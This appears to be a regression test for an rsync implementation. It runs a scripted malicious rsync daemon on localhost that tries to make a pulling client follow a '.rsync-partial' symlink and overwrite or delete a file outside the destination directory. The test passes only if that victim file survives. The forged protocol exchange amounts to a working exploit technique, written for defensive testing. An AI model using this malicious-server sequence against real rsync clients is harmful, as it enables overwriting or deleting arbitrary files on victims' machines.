#!/usr/bin/env python3

import hashlib
import os
import socket
import struct
import subprocess
import threading
import time

from harness.rsync import (
    SCRATCHDIR, claim_ports, makepath, require_tcp, rmtree, rsync_argv,
    test_fail,
)
from harness import protocol as rp

PORT = 13153
CF_INPLACE_PARTIAL_DIR = 1 << 6
FNAMECMP_PARTIAL_DIR = 0x81
PAYLOAD = b'MALICIOUS-SERVER-OVERWRITE\n'
ORIGINAL = b'CLIENT-LOCAL-OUTSIDE-VICTIM\n'

require_tcp('the malicious sender needs a real TCP socket; run with --use-tcp')
claim_ports(PORT)

base = SCRATCHDIR / 'malicious-server-partial-basis-symlink-overwrite'
rmtree(base)
dest = base / 'dest'
outside = base / 'outside'
makepath(dest / 'escape', outside)
victim = outside / 'victim'
victim.write_bytes(ORIGINAL)

partial_link = dest / 'escape' / '.rsync-partial'
os.symlink(str(outside), partial_link)
if os.lstat(partial_link).st_uid != os.geteuid():
    test_fail('setup did not create a receiver-euid-owned partial-dir symlink')

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind(('127.0.0.1', PORT))
lsock.listen(1)
lsock.settimeout(30)
state = {}

def serve():
    try:
        csock, _ = lsock.accept()
        peer = rp.DaemonReceiver(csock)
        peer.handshake(compat_flags=CF_INPLACE_PARTIAL_DIR)
        nul_run = 0
        while nul_run < 2:
            b = peer._recv_exact(1)
            nul_run = nul_run + 1 if b == b'\0' else 0
        parent = rp.FileEntry(
            'escape', mode=rp.S_IFDIR | 0o755,
            extra_flags=rp.XMIT_TOP_DIR | rp.XMIT_NO_CONTENT_DIR,
            modtime=1700000000,
        )
        entry = rp.FileEntry(
            'escape/victim', mode=rp.S_IFREG | 0o644,
            length=len(PAYLOAD), modtime=1700000000,
        )
        peer.send_data(parent.encode() + entry.encode() + rp.end_of_flist())

        mux = bytearray()

        def read_data(n):
            while len(mux) < n:
                word = struct.unpack('<I', peer._recv_exact(4))[0]
                payload = peer._recv_exact(word & 0xFFFFFF)
                if (word >> 24) - rp.MPLEX_BASE == rp.MSG_DATA:
                    mux.extend(payload)
            out = bytes(mux[:n])
            del mux[:n]
            return out

        def r_int():
            return struct.unpack('<i', read_data(4))[0]

        def r_shortint():
            return struct.unpack('<H', read_data(2))[0]

        def r_byte():
            return read_data(1)[0]

        def r_ndx():
            b0 = read_data(1)[0]
            if b0 == 0:
                raise RuntimeError('generator sent NDX_DONE before requesting '
                                   'anything')
            if b0 == 0xFF:
                raise RuntimeError('generator sent a negative index first')
            if b0 == 0xFE:
                b = read_data(2)
                if b[0] & 0x80:
                    rest = read_data(2)
                    return (((b[0] & 0x7F) << 24) | b[1]
                            | (rest[0] << 8) | (rest[1] << 16))
                return (b[0] << 8) + b[1] - 1
            return b0 - 1

        peer.sock.settimeout(10)
        try:
            while True:
                n = r_int()
                if n == 0:
                    break
                if not 0 < n <= 4096:
                    raise RuntimeError(f'implausible filter-rule length {n}')
                read_data(n)

            ndx = r_ndx()
            if ndx != 1:
                raise RuntimeError(f'generator asked for index {ndx}, not 1')
            iflags = r_shortint()
            if not (iflags & rp.ITEM_TRANSFER):
                raise RuntimeError(
                    f'generator did not ask to transfer index 1 '
                    f'(item flags 0x{iflags:04x})')
            requested_basis = rp.FNAMECMP_FNAME
            if iflags & rp.ITEM_BASIS_TYPE_FOLLOWS:
                requested_basis = r_byte()
                if requested_basis != FNAMECMP_PARTIAL_DIR:
                    raise RuntimeError(
                        'generator named basis type '
                        f'0x{requested_basis:02x}, expected either none or '
                        f'FNAMECMP_PARTIAL_DIR (0x{FNAMECMP_PARTIAL_DIR:02x})')
            if iflags & rp.ITEM_XNAME_FOLLOWS:
                ln = r_byte()
                if ln == 0xFF:
                    ln = r_byte() + 0x80
                read_data(ln)
        except TimeoutError as exc:
            raise RuntimeError(
                'generator never requested index 1'
            ) from exc

        response = bytearray()
        response += peer.w_ndx(1)
        response += rp.w_shortint(
            rp.ITEM_TRANSFER | rp.ITEM_BASIS_TYPE_FOLLOWS)
        response += rp.w_byte(FNAMECMP_PARTIAL_DIR)
        response += rp.w_sum_head(0, 0, 0, 0)
        response += rp.w_int(len(PAYLOAD)) + PAYLOAD
        response += rp.w_int(0)
        response += hashlib.md5(PAYLOAD).digest()
        response += peer.w_ndx(rp.NDX_DONE)
        response += peer.w_ndx(rp.NDX_DONE)
        response += peer.w_ndx(rp.NDX_DONE)
        peer.send_data(response)
        time.sleep(2)
        peer.close()
    except Exception as exc:
        state['err'] = repr(exc)

thread = threading.Thread(target=serve, daemon=True)
thread.start()
proc = subprocess.run(
    rsync_argv('-R', '--no-implied-dirs', '--partial-dir=.rsync-partial',
               '--no-whole-file',
               f'rsync://127.0.0.1:{PORT}/mod/', str(dest) + '/'),
    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20,
)
thread.join(timeout=5)
lsock.close()

output = (proc.stdout or '') + (proc.stderr or '')
if state.get('err'):
    test_fail(f'Python sender failed: {state["err"]}\n{output}')
if not victim.exists():
    test_fail(
        'malicious pull server made partial-basis cleanup follow a '
        'receiver-owned symlink and delete an arbitrary client-local file '
        'outside the destination tree'
    )
after = victim.read_bytes()
if after == PAYLOAD:
    test_fail(
        'malicious pull server made an in-place partial-basis update follow '
        'a receiver-owned symlink and overwrite an arbitrary client-local '
        'file outside the destination tree'
    )
if after != ORIGINAL:
    test_fail(f'outside victim changed unexpectedly: {after!r}\n{output}')

print('malicious-server-partial-basis-symlink-overwrite: outside victim survived')
